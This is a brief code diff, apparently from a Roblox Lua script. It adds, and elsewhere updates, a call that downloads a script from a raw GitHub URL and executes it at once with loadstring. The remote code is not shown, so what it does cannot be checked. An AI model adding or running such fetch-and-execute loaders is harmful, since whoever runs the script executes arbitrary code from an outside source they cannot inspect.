@@ -294,6 +294,10 @@ spawn(function()
            Duration = 25; })
            end)
 
+task.spawn(function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LiverMods/raw/main/Alls/01"))()
+end)
+
 else
 local player = game.Players:GetPlayerFromCharacter(char)
 
@@ -501,7 +505,7 @@ end)
            end)
 
 
-spawn(function()
+task.spawn(function()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/LiverMods/raw/main/Alls/01"))()
 end)
 
